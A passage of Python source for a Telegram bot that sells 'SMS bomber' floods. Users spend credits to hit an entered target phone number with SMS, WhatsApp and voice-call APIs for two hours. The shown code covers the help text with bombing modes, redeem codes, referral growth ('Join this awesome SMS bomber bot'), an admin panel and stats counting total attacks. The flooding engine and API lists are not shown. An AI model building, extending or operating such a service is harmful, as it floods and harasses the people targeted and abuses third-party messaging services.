        f"3. Click 'Start Bombing'\n"
        f"4. Choose your bombing mode\n"
        f"5. Enter target number\n"
        f"6. Bombing starts automatically\n\n"
        f"{P_MODE} <b>Bombing Modes:</b>\n"
        f"• {P_EXPLOSION} All Out: Uses all APIs\n"
        f"• {P_MOBILE} SMS Only: SMS APIs\n"
        f"• {P_CHAT} WhatsApp Only: WhatsApp APIs\n"
        f"• {P_PHONE} Voice Only: Voice call APIs\n\n"
        f"{P_LIGHTNING} <b>Features:</b>\n"
        f"• Ultra-fast bombing\n"
        f"• {len(SMS_APIS)+len(WHATSAPP_APIS)+len(VOICE_APIS)}+ APIs\n"
        f"• 2 hour duration\n"
        f"• Real-time progress\n"
        f"• Stop anytime\n"
        f"• {P_TROPHY} Leaderboard\n\n"
        f"{P_DIAMOND} <b>Credits System:</b>\n"
        f"• Start with 2 credits\n"
        f"• 1 credit = 2 hours bombing\n"
        f"• Credit deducted when bombing starts\n"
        f"• Get more via referrals (/refer)\n"
        f"• Redeem codes via main menu button\n\n"
        f"{P_INFO} <b>Commands:</b>\n"
        f"/start - Start bot\n"
        f"/profile - Your stats\n"
        f"/refer - Referral link\n"
        f"/credits - Check credits\n"
        f"/help - This message\n\n"
        f"{P_DEV} Developer: {DEV_NAME}",
        parse_mode='HTML',
    )
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data == "contact_admin")
def handle_contact_admin(call):
    bot.send_message(
        call.message.chat.id,
        f"{P_PHONE} <b>CONTACT ADMIN</b>\n\n"
        f"{P_USER} <b>Admin:</b> {OWNER_USERNAME}\n\n"
        f"{P_STAR} <b>Reasons to contact:</b>\n"
        f"• {P_ALERT} Report bugs/issues\n"
        f"• {P_DIAMOND} Request more credits\n"
        f"• {P_GIFT} Partnership inquiries\n"
        f"• {P_INFO} General questions\n\n"
        f"{P_CLOCK} <b>Response Time:</b>\n"
        f"• Usually within 24 hours\n"
        f"• Please be patient\n\n"
        f"{P_LOCK} <b>Note:</b> Don't spam the admin!\n\n"
        f"{BRAND_NAME} | {DEV_NAME}",
        parse_mode='HTML',
    )
    bot.answer_callback_query(call.id)

# ==================== REDEEM SYSTEM (USER SIDE) ====================
@bot.callback_query_handler(func=lambda call: call.data == "redeem_info")
def handle_redeem_info(call):
    user_id = call.from_user.id
    if is_banned_guard(user_id):
        bot.answer_callback_query(call.id, "❌ You are banned!")
        return
        
    keyboard = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    keyboard.add(KeyboardButton("Cancel"))
    
    msg = bot.send_message(
        call.message.chat.id,
        f"{P_GIFT} <b>ʀᴇᴅᴇᴇᴍ ᴄᴏᴅᴇ</b>\n\n"
        f"ᴀᴩɴᴀ ᴄᴏᴅᴇ ᴇɴᴛᴇʀ ᴋᴀʀᴇɪɴ:",
        parse_mode='HTML',
        reply_markup=keyboard
    )
    bot.register_next_step_handler(msg, process_user_redeem)
    bot.answer_callback_query(call.id)

def process_user_redeem(message):
    if message.text and message.text.lower() == 'cancel':
        bot.send_message(message.chat.id, "❌ ʀᴇᴅᴇᴇᴍ ᴄᴀɴᴄᴇʟʟᴇᴅ.", reply_markup=ReplyKeyboardRemove())
        return
        
    if not message.text:
        bot.send_message(message.chat.id, "❌ ɪɴᴠᴀʟɪᴅ ꜰᴏʀᴍᴀᴛ.", reply_markup=ReplyKeyboardRemove())
        return

    code = message.text.strip().upper()
    
    success, response_msg = redeem_code(message.from_user.id, code)
    
    if success:
        user = get_user(message.from_user.id)
        current_balance = user[4] if user else 0
        added_credits = response_msg
        
        success_text = (
            f"🦋 <b>ʀᴇᴅᴇᴇᴍ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟ!</b>\n\n"
            f"{P_ROCKET} +{added_credits} ᴄʀᴇᴅɪᴛꜱ ᴀᴅᴅᴇᴅ!\n"
            f"{P_ROCKET} ʙᴀʟᴀɴᴄᴇ: {current_balance}"
        )
        bot.send_message(message.chat.id, success_text, parse_mode='HTML', reply_markup=ReplyKeyboardRemove())
    else:
        if response_msg == "Invalid code":
            err = "❌ ɪɴᴠᴀʟɪᴅ ᴄᴏᴅᴇ! ᴩʟᴇᴀꜱᴇ ᴄʜᴇᴄᴋ ᴀɴᴅ ᴛʀʏ ᴀɢᴀɪɴ."
        elif response_msg == "Code limit reached":
            err = "❌ ᴛʜɪꜱ ᴄᴏᴅᴇ ʜᴀꜱ ʀᴇᴀᴄʜᴇᴅ ɪᴛꜱ ᴍᴀxɪᴍᴜᴍ ʟɪᴍɪᴛ!"
        elif response_msg == "You already used this code":
            err = "❌ ʏᴏᴜ ʜᴀᴠᴇ ᴀʟʀᴇᴀᴅʏ ᴜꜱᴇᴅ ᴛʜɪꜱ ᴄᴏᴅᴇ!"
        else:
            err = f"❌ {response_msg}"
            
        bot.send_message(message.chat.id, err, reply_markup=ReplyKeyboardRemove())

# ==================== ADMIN PANEL ====================
@bot.callback_query_handler(func=lambda call: call.data == "admin_panel")
def handle_admin_panel(call):
    user_id = call.from_user.id
    if user_id not in ADMIN_IDS:
        bot.answer_callback_query(call.id, "❌ Access denied!")
        return
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("📊 ꜱᴛᴀᴛꜱ", callback_data="admin_stats", style="primary"),
        InlineKeyboardButton("📢 ʙʀᴏᴀᴅᴄᴀꜱᴛ", callback_data="admin_broadcast", style="primary"),
    )
    keyboard.add(
        InlineKeyboardButton("➕ ᴀᴅᴅ ᴄʀᴇᴅɪᴛꜱ", callback_data="admin_add_credits", style="success"),
        InlineKeyboardButton("➖ ʀᴇᴍᴏᴠᴇ ᴄʀᴇᴅɪᴛꜱ", callback_data="admin_remove_credits", style="danger"),
    )
    keyboard.add(
        InlineKeyboardButton("👥 ᴜꜱᴇʀꜱ", callback_data="admin_users", style="primary"),
        InlineKeyboardButton("📈 ʀᴇꜰᴇʀʀᴀʟꜱ", callback_data="admin_referrals", style="primary"),
    )
    keyboard.add(
        InlineKeyboardButton("🚫 ʙᴀɴ ᴜꜱᴇʀ", callback_data="admin_ban", style="danger"),
        InlineKeyboardButton("✅ ᴜɴʙᴀɴ ᴜꜱᴇʀ", callback_data="admin_unban", style="success"),
    )
    keyboard.add(
        InlineKeyboardButton("🎟️ ᴄʀᴇᴀᴛᴇ ʀᴇᴅᴇᴇᴍ", callback_data="admin_create_redeem", style="primary"),
    )
    keyboard.add(InlineKeyboardButton("◀️ ʙᴀᴄᴋ", callback_data="back_to_menu"))
    bot.send_message(
        call.message.chat.id,
        f"{P_CROWN} <b>ADMIN PANEL</b> — {BRAND_NAME}\n\n{P_INFO} Select an option below:",
        parse_mode='HTML',
        reply_markup=keyboard,
    )
    bot.answer_callback_query(call.id)

# --- BAN / UNBAN ---
@bot.callback_query_handler(func=lambda call: call.data == "admin_ban")
def handle_admin_ban(call):
    if call.from_user.id not in ADMIN_IDS:
        bot.answer_callback_query(call.id, "❌ Access denied!")
        return
    msg = bot.send_message(
        call.message.chat.id,
        f"{P_STOP} <b>ʙᴀɴ ᴜꜱᴇʀ</b>\n\n"
        f"ꜱᴇɴᴅ ᴛʜᴇ ᴜꜱᴇʀ ɪᴅ ᴛᴏ ʙᴀɴ.\nᴇxᴀᴍᴩʟᴇ: <code>123456789</code>\n\n"
        f"ᴛʏᴩᴇ /ᴄᴀɴᴄᴇʟ ᴛᴏ ᴀʙᴏʀᴛ",
        parse_mode='HTML',
    )
    bot.register_next_step_handler(msg, process_ban_user)

def process_ban_user(message):
    if message.text == '/cancel':
        bot.send_message(message.chat.id, "❌ ᴄᴀɴᴄᴇʟʟᴇᴅ.")
        return
    try:
        uid = int(message.text.strip())
        if not get_user(uid):
            bot.send_message(message.chat.id, f"{P_SAD} ᴜꜱᴇʀ ɴᴏᴛ ꜰᴏᴜɴᴅ ɪɴ ᴅᴀᴛᴀʙᴀꜱᴇ.")
            return
        set_ban_status(uid, True)
        try:
            bot.send_message(uid, f"{P_STOP} ʏᴏᴜ ʜᴀᴠᴇ ʙᴇᴇɴ <b>ʙᴀɴɴᴇᴅ</b> ʙʏ ᴀᴅᴍɪɴ.", parse_mode='HTML')
        except Exception:
            pass
        bot.send_message(
            message.chat.id,
            f"{P_CHECK} ᴜꜱᴇʀ <code>{uid}</code> ʜᴀꜱ ʙᴇᴇɴ <b>ʙᴀɴɴᴇᴅ</b> {P_STOP}\n\n{BRAND_NAME}",
            parse_mode='HTML',
        )
    except Exception as e:
        bot.send_message(message.chat.id, f"{P_SAD} ᴇʀʀᴏʀ: {e}")

@bot.callback_query_handler(func=lambda call: call.data == "admin_unban")
def handle_admin_unban(call):
    if call.from_user.id not in ADMIN_IDS:
        bot.answer_callback_query(call.id, "❌ Access denied!")
        return
    msg = bot.send_message(
        call.message.chat.id,
        f"{P_CHECK} <b>ᴜɴʙᴀɴ ᴜꜱᴇʀ</b>\n\n"
        f"ꜱᴇɴᴅ ᴛʜᴇ ᴜꜱᴇʀ ɪᴅ ᴛᴏ ᴜɴʙᴀɴ.\nᴇxᴀᴍᴩʟᴇ: <code>123456789</code>\n\n"
        f"ᴛʏᴩᴇ /ᴄᴀɴᴄᴇʟ ᴛᴏ ᴀʙᴏʀᴛ",
        parse_mode='HTML',
    )
    bot.register_next_step_handler(msg, process_unban_user)

def process_unban_user(message):
    if message.text == '/cancel':
        bot.send_message(message.chat.id, "❌ ᴄᴀɴᴄᴇʟʟᴇᴅ.")
        return
    try:
        uid = int(message.text.strip())
        if not get_user(uid):
            bot.send_message(message.chat.id, f"{P_SAD} ᴜꜱᴇʀ ɴᴏᴛ ꜰᴏᴜɴᴅ ɪɴ ᴅᴀᴛᴀʙᴀꜱᴇ.")
            return
        set_ban_status(uid, False)
        try:
            bot.send_message(uid, f"{P_CHECK} ʏᴏᴜ ʜᴀᴠᴇ ʙᴇᴇɴ <b>ᴜɴʙᴀɴɴᴇᴅ</b>. ᴡᴇʟᴄᴏᴍᴇ ʙᴀᴄᴋ!", parse_mode='HTML')
        except Exception:
            pass
        bot.send_message(
            message.chat.id,
            f"{P_CHECK} ᴜꜱᴇʀ <code>{uid}</code> ʜᴀꜱ ʙᴇᴇɴ <b>ᴜɴʙᴀɴɴᴇᴅ</b> {P_COOL}\n\n{BRAND_NAME}",
            parse_mode='HTML',
        )
    except Exception as e:
        bot.send_message(message.chat.id, f"{P_SAD} ᴇʀʀᴏʀ: {e}")

# --- CREATE REDEEM (3 STEPS) ---
@bot.callback_query_handler(func=lambda call: call.data == "admin_create_redeem")
def handle_admin_create_redeem(call):
    if call.from_user.id not in ADMIN_IDS:
        bot.answer_callback_query(call.id, "❌ Access denied!")
        return
    msg = bot.send_message(
        call.message.chat.id,
        f"{P_GIFT} <b>ᴄʀᴇᴀᴛᴇ ʀᴇᴅᴇᴇᴍ ᴄᴏᴅᴇ — ꜱᴛᴇᴩ 1/3</b>\n\n"
        f"{P_DIAMOND} ᴋɪᴛɴᴇ ᴄʀᴇᴅɪᴛꜱ ᴅᴇɴᴇ ʜᴀɪ?\n"
        f"ᴇxᴀᴍᴩʟᴇ: <code>500</code>\n\n"
        f"ᴛʏᴩᴇ /ᴄᴀɴᴄᴇʟ ᴛᴏ ᴀʙᴏʀᴛ",
        parse_mode='HTML',
    )
    bot.register_next_step_handler(msg, process_redeem_credits)

def process_redeem_credits(message):
    if message.text == '/cancel':
        bot.send_message(message.chat.id, "❌ ᴄᴀɴᴄᴇʟʟᴇᴅ.")
        return
    try:
        credits = int(message.text.strip())
        if credits <= 0:
            raise ValueError
        msg = bot.send_message(
            message.chat.id,
            f"{P_GIFT} <b>ꜱᴛᴇᴩ 2/3</b>\n\n"
            f"{P_USERS} ᴋɪᴛɴᴇ ᴜꜱᴇʀꜱ ᴋᴇ ʟɪʏᴇ ᴄᴏᴅᴇ ᴠᴀʟɪᴅ ʜᴏ?\n"
            f"ᴇxᴀᴍᴩʟᴇ: <code>10</code>\n\n"
            f"ᴛʏᴩᴇ /ᴄᴀɴᴄᴇʟ ᴛᴏ ᴀʙᴏʀᴛ",
            parse_mode='HTML',
        )
        bot.register_next_step_handler(msg, process_redeem_maxusers, credits)
    except Exception:
        bot.send_message(message.chat.id, f"{P_SAD} ɪɴᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ. ᴛʀʏ ᴀɢᴀɪɴ.")

def process_redeem_maxusers(message, credits):
    if message.text == '/cancel':
        bot.send_message(message.chat.id, "❌ ᴄᴀɴᴄᴇʟʟᴇᴅ.")
        return
    try:
        max_uses = int(message.text.strip())
        if max_uses <= 0:
            raise ValueError
        msg = bot.send_message(
            message.chat.id,
            f"{P_GIFT} <b>ꜱᴛᴇᴩ 3/3</b>\n\n"
            f"{P_PIN} ᴄᴏᴅᴇ ᴋᴀ ɴᴀᴀᴍ ʙʜᴇᴊᴏ (ᴇ.ɢ. <code>SHIVA500</code>)\n\n"
            f"ᴛʏᴩᴇ /ᴄᴀɴᴄᴇʟ ᴛᴏ ᴀʙᴏʀᴛ",
            parse_mode='HTML',
        )
        bot.register_next_step_handler(msg, process_redeem_name, credits, max_uses)
    except Exception:
        bot.send_message(message.chat.id, f"{P_SAD} ɪɴᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ. ᴛʀʏ ᴀɢᴀɪɴ.")

def process_redeem_name(message, credits, max_uses):
    if message.text == '/cancel':
        bot.send_message(message.chat.id, "❌ ᴄᴀɴᴄᴇʟʟᴇᴅ.")
        return
    code = message.text.strip().upper()
    if not code.isalnum():
        bot.send_message(message.chat.id, f"{P_SAD} ᴄᴏᴅᴇ ᴍᴜꜱᴛ ʙᴇ ᴀʟᴩʜᴀɴᴜᴍᴇʀɪᴄ.")
        return
    if get_redeem_code(code):
        bot.send_message(message.chat.id, f"{P_SAD} ᴄᴏᴅᴇ ᴀʟʀᴇᴀᴅʏ ᴇxɪꜱᴛꜱ! ᴛʀʏ ᴀɴᴏᴛʜᴇʀ ɴᴀᴍᴇ.")
        return
    create_redeem_code(code, credits, max_uses, message.from_user.id)
    bot.send_message(
        message.chat.id,
        f"{P_CHECK} <b>ʀᴇᴅᴇᴇᴍ ᴄᴏᴅᴇ ᴄʀᴇᴀᴛᴇᴅ</b> {P_PARTY}\n\n"
        f"{P_GIFT} ᴄᴏᴅᴇ: <code>{code}</code>\n"
        f"{P_DIAMOND} ᴄʀᴇᴅɪᴛꜱ: <b>{credits}</b>\n"
        f"{P_USERS} ᴍᴀx ᴜꜱᴇʀꜱ: <b>{max_uses}</b>\n\n"
        f"ꜱʜᴀʀᴇ ᴛʜɪꜱ ᴄᴏᴅᴇ ᴡɪᴛʜ ᴜꜱᴇʀꜱ. ᴛʜᴇʏ ᴄᴀɴ ʀᴇᴅᴇᴇᴍ ᴠɪᴀ ᴛʜᴇ ʀᴇᴅᴇᴇᴍ ʙᴜᴛᴛᴏɴ ɪɴ ᴍᴀɪɴ ᴍᴇɴᴜ.\n\n"
        f"{BRAND_NAME} | {DEV_NAME}",
        parse_mode='HTML',
    )

@bot.callback_query_handler(func=lambda call: call.data == "admin_stats")
def handle_admin_stats(call):
    with sqlite3.connect(DB_NAME) as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT COUNT(*) FROM users')
        total_users = cursor.fetchone()[0]
        cursor.execute('SELECT COUNT(*) FROM users WHERE DATE(join_date) = DATE("now")')
        new_today = cursor.fetchone()[0]
        cursor.execute('SELECT COUNT(*) FROM bombs')
        total_bombs = cursor.fetchone()[0]
        cursor.execute('SELECT COUNT(*) FROM bombs WHERE is_active = 1')
        active_bombs = cursor.fetchone()[0]
        cursor.execute('SELECT COALESCE(SUM(credits), 0) FROM users')
        total_credits = cursor.fetchone()[0]
        cursor.execute('SELECT COALESCE(SUM(sms_sent+calls_made+whatsapp_sent), 0) FROM bombs')
        total_attacks = cursor.fetchone()[0]
    bot.send_message(
        call.message.chat.id,
        f"{P_PROFILE} <b>ᴀᴅᴍɪɴ ꜱᴛᴀᴛɪꜱᴛɪᴄꜱ</b> — {BRAND_NAME}\n\n"
        f"{P_USERS} ᴛᴏᴛᴀʟ ᴜꜱᴇʀꜱ: <b>{total_users}</b>\n"
        f"{P_NEW} ɴᴇᴡ ᴛᴏᴅᴀʏ: <b>{new_today}</b>\n"
        f"{P_BOMB} ᴛᴏᴛᴀʟ ʙᴏᴍʙꜱ: <b>{total_bombs}</b>\n"
        f"{P_LIGHTNING} ᴀᴄᴛɪᴠᴇ ʙᴏᴍʙꜱ: <b>{active_bombs}</b>\n"
        f"{P_TARGET} ᴛᴏᴛᴀʟ ᴀᴛᴛᴀᴄᴋꜱ: <b>{total_attacks:,}</b>\n"
        f"{P_DIAMOND} ᴛᴏᴛᴀʟ ᴄʀᴇᴅɪᴛꜱ: <b>{total_credits}</b>\n"
        f"{P_MOBILE} ꜱᴍꜱ ᴀᴩɪꜱ: {len(SMS_APIS)}\n"
        f"{P_CHAT} ᴡʜᴀᴛꜱᴀᴩᴩ ᴀᴩɪꜱ: {len(WHATSAPP_APIS)}\n"
        f"{P_PHONE} ᴠᴏɪᴄᴇ ᴀᴩɪꜱ: {len(VOICE_APIS)}\n"
        f"{P_ROBOT} ʙᴏᴛ: @{bot.get_me().username}\n"
        f"{P_MEGA} ᴄʜᴀɴɴᴇʟ: <code>{CHANNEL_ID}</code>\n"
        f"{P_DEV} ᴅᴇᴠᴇʟᴏᴩᴇʀ: {DEV_NAME}",
        parse_mode='HTML',
    )
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data == "admin_broadcast")
def handle_admin_broadcast(call):
    if call.from_user.id not in ADMIN_IDS:
        bot.answer_callback_query(call.id, "❌ Access denied!")
        return
    msg = bot.send_message(
        call.message.chat.id,
        f"{P_MEGA} <b>ꜱᴇɴᴅ ʙʀᴏᴀᴅᴄᴀꜱᴛ ᴍᴇꜱꜱᴀɢᴇ</b> — {BRAND_NAME}\n\n"
        f"ꜱᴇɴᴅ ᴛʜᴇ ᴍᴇꜱꜱᴀɢᴇ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ʙʀᴏᴀᴅᴄᴀꜱᴛ ᴛᴏ ᴀʟʟ ᴜꜱᴇʀꜱ.\n"
        f"ᴛʏᴩᴇ /ᴄᴀɴᴄᴇʟ ᴛᴏ ᴀʙᴏʀᴛ",
        parse_mode='HTML',
    )
    bot.register_next_step_handler(msg, process_broadcast)

def process_broadcast(message):
    if message.text == '/cancel':
        bot.send_message(message.chat.id, "❌ ʙʀᴏᴀᴅᴄᴀꜱᴛ ᴄᴀɴᴄᴇʟʟᴇᴅ.")
        return
    with sqlite3.connect(DB_NAME) as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT user_id FROM users')
        users = [r[0] for r in cursor.fetchall()]
    total = len(users)
    ok = 0
    fail = 0
    bot.send_message(message.chat.id, f"📤 ʙʀᴏᴀᴅᴄᴀꜱᴛɪɴɢ ᴛᴏ {total} ᴜꜱᴇʀꜱ...")
    for uid in users:
        try:
            bot.copy_message(uid, message.chat.id, message.message_id)
            ok += 1
        except Exception:
            fail += 1
        time.sleep(0.05)
    bot.send_message(
        message.chat.id,
        f"{P_CHECK} <b>ʙʀᴏᴀᴅᴄᴀꜱᴛ ᴄᴏᴍᴩʟᴇᴛᴇ</b> {P_MEGA} {P_CLAP}\n\n"
        f"{P_SHARE} ꜱᴇɴᴛ: <b>{ok}</b>\n{P_CROSS} ꜰᴀɪʟᴇᴅ: <b>{fail}</b>\n"
        f"{P_CHART} ʀᴀᴛᴇ: <b>{(ok/total*100):.1f}%</b>\n\n"
        f"{BRAND_NAME} | {DEV_NAME}" if total else "ɴᴏ ᴜꜱᴇʀꜱ",
        parse_mode='HTML',
    )

@bot.callback_query_handler(func=lambda call: call.data == "admin_add_credits")
def handle_admin_add_credits(call):
    if call.from_user.id not in ADMIN_IDS:
        bot.answer_callback_query(call.id, "❌ Access denied!")
        return
    msg = bot.send_message(
        call.message.chat.id,
        f"{P_PLUS} <b>ᴀᴅᴅ ᴄʀᴇᴅɪᴛꜱ</b> — {BRAND_NAME}\n\nꜱᴇɴᴅ <code>ᴜꜱᴇʀ_ɪᴅ ᴀᴍᴏᴜɴᴛ</code>\nᴇxᴀᴍᴩʟᴇ: <code>123456789 5</code>\nᴛʏᴩᴇ /ᴄᴀɴᴄᴇʟ ᴛᴏ ᴀʙᴏʀᴛ",
        parse_mode='HTML',
    )
    bot.register_next_step_handler(msg, process_add_credits)

def process_add_credits(message):
    if message.text == '/cancel':
        bot.send_message(message.chat.id, "❌ ᴄᴀɴᴄᴇʟʟᴇᴅ.")
        return
    try:
        parts = message.text.split()
        uid, amt = int(parts[0]), int(parts[1])
        update_user_credits(uid, amt)
        try:
            bot.send_message(uid, f"{P_PARTY} {P_GIFT} ᴀᴅᴍɪɴ ᴀᴅᴅᴇᴅ <b>{amt} ᴄʀᴇᴅɪᴛꜱ</b>! ᴛᴏᴛᴀʟ: <b>{get_user(uid)[4]}</b>", parse_mode='HTML')
        except Exception:
            pass
        bot.send_message(message.chat.id, f"{P_CHECK} ᴀᴅᴅᴇᴅ <b>{amt}</b> ᴄʀᴇᴅɪᴛꜱ ᴛᴏ <code>{uid}</code> {P_COOL} — {BRAND_NAME}", parse_mode='HTML')
    except Exception as e:
        bot.send_message(message.chat.id, f"{P_SAD} ᴇʀʀᴏʀ: {e}")

@bot.callback_query_handler(func=lambda call: call.data == "admin_remove_credits")
def handle_admin_remove_credits(call):
    if call.from_user.id not in ADMIN_IDS:
        bot.answer_callback_query(call.id, "❌ Access denied!")
        return
    msg = bot.send_message(
        call.message.chat.id,
        f"{P_MINUS} <b>ʀᴇᴍᴏᴠᴇ ᴄʀᴇᴅɪᴛꜱ</b> — {BRAND_NAME}\n\nꜱᴇɴᴅ <code>ᴜꜱᴇʀ_ɪᴅ ᴀᴍᴏᴜɴᴛ</code>\nᴇxᴀᴍᴩʟᴇ: <code>123456789 2</code>\nᴛʏᴩᴇ /ᴄᴀɴᴄᴇʟ ᴛᴏ ᴀʙᴏʀᴛ",
        parse_mode='HTML',
    )
    bot.register_next_step_handler(msg, process_remove_credits)

def process_remove_credits(message):
    if message.text == '/cancel':
        bot.send_message(message.chat.id, "❌ ᴄᴀɴᴄᴇʟʟᴇᴅ.")
        return
    try:
        parts = message.text.split()
        uid, amt = int(parts[0]), int(parts[1])
        update_user_credits(uid, -amt)
        try:
            bot.send_message(uid, f"{P_ALERT} ᴀᴅᴍɪɴ ʀᴇᴍᴏᴠᴇᴅ <b>{amt} ᴄʀᴇᴅɪᴛꜱ</b>. ᴛᴏᴛᴀʟ: <b>{get_user(uid)[4]}</b>", parse_mode='HTML')
        except Exception:
            pass
        bot.send_message(message.chat.id, f"{P_CHECK} ʀᴇᴍᴏᴠᴇᴅ <b>{amt}</b> ᴄʀᴇᴅɪᴛꜱ ꜰʀᴏᴍ <code>{uid}</code> {P_COOL} — {BRAND_NAME}", parse_mode='HTML')
    except Exception as e:
        bot.send_message(message.chat.id, f"{P_SAD} ᴇʀʀᴏʀ: {e}")

@bot.callback_query_handler(func=lambda call: call.data == "admin_users")
def handle_admin_users(call):
    if call.from_user.id not in ADMIN_IDS:
        bot.answer_callback_query(call.id, "❌ Access denied!")
        return
    users = get_all_users()
    if not users:
        bot.send_message(call.message.chat.id, "❌ ɴᴏ ᴜꜱᴇʀꜱ ꜰᴏᴜɴᴅ!")
        return
    msg = f"{P_USERS} <b>ᴀʟʟ ᴜꜱᴇʀꜱ</b> — {BRAND_NAME}\n\n"
    for i, (uid, uname, fname, credits) in enumerate(users[:50], 1):
        ud = f"@{esc(uname)}" if uname else "ɴᴏ ᴜꜱᴇʀɴᴀᴍᴇ"
        msg += f"{i}. {esc(fname)} ({ud})\n   ɪᴅ: <code>{uid}</code> | ᴄʀᴇᴅɪᴛꜱ: {credits}\n\n"
    if len(users) > 50:
        msg += f"... ᴀɴᴅ {len(users)-50} ᴍᴏʀᴇ ᴜꜱᴇʀꜱ"
    bot.send_message(call.message.chat.id, msg, parse_mode='HTML')
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data == "admin_referrals")
def handle_admin_referrals(call):
    if call.from_user.id not in ADMIN_IDS:
        bot.answer_callback_query(call.id, "❌ Access denied!")
        return
    with sqlite3.connect(DB_NAME) as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT COUNT(*) FROM referrals')
        total_refs = cursor.fetchone()[0]
        cursor.execute('SELECT COUNT(*) FROM referrals WHERE credit_claimed = 1')
        claimed = cursor.fetchone()[0]
        cursor.execute('SELECT COUNT(*) FROM referrals WHERE credit_claimed = 0')
        pending = cursor.fetchone()[0]
        cursor.execute('SELECT referrer_id, COUNT(*) as c FROM referrals GROUP BY referrer_id ORDER BY c DESC LIMIT 10')
        top = cursor.fetchall()
    msg = f"{P_TROPHY} <b>ʀᴇꜰᴇʀʀᴀʟ ꜱᴛᴀᴛɪꜱᴛɪᴄꜱ</b> — {BRAND_NAME}\n\n"
    msg += f"{P_PROFILE} ᴛᴏᴛᴀʟ: <b>{total_refs}</b>\n{P_CHECK} ᴄʟᴀɪᴍᴇᴅ: <b>{claimed}</b>\n{P_DURATION} ᴩᴇɴᴅɪɴɢ: <b>{pending}</b>\n\n{P_TROPHY} <b>ᴛᴏᴩ 10:</b>\n"
    for i, (rid, cnt) in enumerate(top, 1):
        info = get_user(rid)
        fn = esc(info[2]) if info else "ᴜɴᴋɴᴏᴡɴ"
        un = esc(info[1]) if info else ""
        msg += f"{i}. {fn} (@{un})\n   ɪᴅ: <code>{rid}</code> | ʀᴇꜰᴇʀʀᴀʟꜱ: {cnt}\n\n"
    bot.send_message(call.message.chat.id, msg, parse_mode='HTML')
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data == "back_to_menu")
def handle_back_to_menu(call):
    show_main_menu(call.message)
    bot.answer_callback_query(call.id)

# ==================== SHORTCUT COMMANDS ====================
@bot.message_handler(commands=['profile'])
def command_profile(message):
    handle_profile(types.CallbackQuery(id="1", from_user=message.from_user, message=message, data="profile"))

@bot.message_handler(commands=['refer'])
def command_refer(message):
    user_id = message.from_user.id
    ref_link = get_referral_link(user_id)
    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton("📤 ꜱʜᴀʀᴇ ʟɪɴᴋ", url=f"https://t.me/share/url?url={ref_link}&text=Join%20this%20awesome%20SMS%20bomber%20bot!", style="primary"))
    bot.send_message(
        message.chat.id,
        f"{P_TROPHY} <b>ʏᴏᴜʀ ʀᴇꜰᴇʀʀᴀʟ ʟɪɴᴋ</b> {P_GIFT}\n\n🔗 <code>{ref_link}</code>\n\n"
        f"{P_STAR} <b>ʜᴏᴡ ɪᴛ ᴡᴏʀᴋꜱ:</b>\n• ꜱʜᴀʀᴇ ʟɪɴᴋ ᴡɪᴛʜ ꜰʀɪᴇɴᴅꜱ\n• ᴡʜᴇɴ ᴛʜᴇʏ ᴊᴏɪɴ → ʏᴏᴜ ɢᴇᴛ <b>1 ᴄʀᴇᴅɪᴛ</b> {P_HEART}\n• ᴛʜᴇʏ ɢᴇᴛ 2 ꜱᴛᴀʀᴛɪɴɢ ᴄʀᴇᴅɪᴛꜱ\n\n"
        f"ᴄʜᴇᴄᴋ /ᴩʀᴏꜰɪʟᴇ ꜰᴏʀ ʀᴇꜰᴇʀʀᴀʟ ꜱᴛᴀᴛꜱ\n\n{BRAND_NAME} | {DEV_NAME}",
        parse_mode='HTML',
        reply_markup=keyboard,
    )

@bot.message_handler(commands=['credits'])
def command_credits(message):
    user = get_user(message.from_user.id)
    if user:
        bot.send_message(
            message.chat.id,
            f"{P_DIAMOND} <b>ʏᴏᴜʀ ᴄʀᴇᴅɪᴛꜱ</b>\n\nᴀᴠᴀɪʟᴀʙʟᴇ: <b>{user[4]}</b> {P_STAR2}\n"
            f"{P_CLOCK} ᴇᴀᴄʜ ʙᴏᴍʙ (2 ʜᴏᴜʀꜱ): <b>1 ᴄʀᴇᴅɪᴛ</b>\n\n"
            f"{P_INFO} ᴄʀᴇᴅɪᴛ ᴅᴇᴅᴜᴄᴛᴇᴅ ᴡʜᴇɴ ʙᴏᴍʙɪɴɢ ꜱᴛᴀʀᴛꜱ.\nɢᴇᴛ ᴍᴏʀᴇ ᴠɪᴀ /ʀᴇꜰᴇʀ\n\n{BRAND_NAME} | {DEV_NAME}",
            parse_mode='HTML',
        )
    else:
        bot.send_message(message.chat.id, "❌ ᴜꜱᴇ /ꜱᴛᴀʀᴛ ꜰɪʀꜱᴛ.")

@bot.message_handler(commands=['help'])
def command_help(message):
    handle_help(types.CallbackQuery(id="1", from_user=message.from_user, message=message, data="help"))

@bot.message_handler(commands=['admin'])
def command_admin(message):
    handle_admin_panel(types.CallbackQuery(id="1", from_user=message.from_user, message=message, data="admin_panel"))

# ==================== BACKGROUND ====================
def check_referral_credits():
    while True:
        try:
            with sqlite3.connect(DB_NAME) as conn:
                cursor = conn.cursor()
                cursor.execute('''
                    SELECT r.referrer_id, r.referred_id
                    FROM referrals r
                    JOIN users u ON r.referred_id = u.user_id
                    WHERE r.credit_claimed = 0 AND u.is_approved = 1
                    LIMIT 10
                ''')
                for referrer_id, referred_id in cursor.fetchall():
                    claim_referral_credit(referrer_id, referred_id)
                    try:
                        ref_user = get_user(referred_id)
                        ref_name = esc(ref_user[2]) if ref_user else "ᴜɴᴋɴᴏᴡɴ"
                        bot.send_message(
                            referrer_id,
                            f"{P_PARTY} <b>ʀᴇꜰᴇʀʀᴀʟ ᴄʀᴇᴅɪᴛ ᴇᴀʀɴᴇᴅ!</b> {P_LOVE}\n\n"
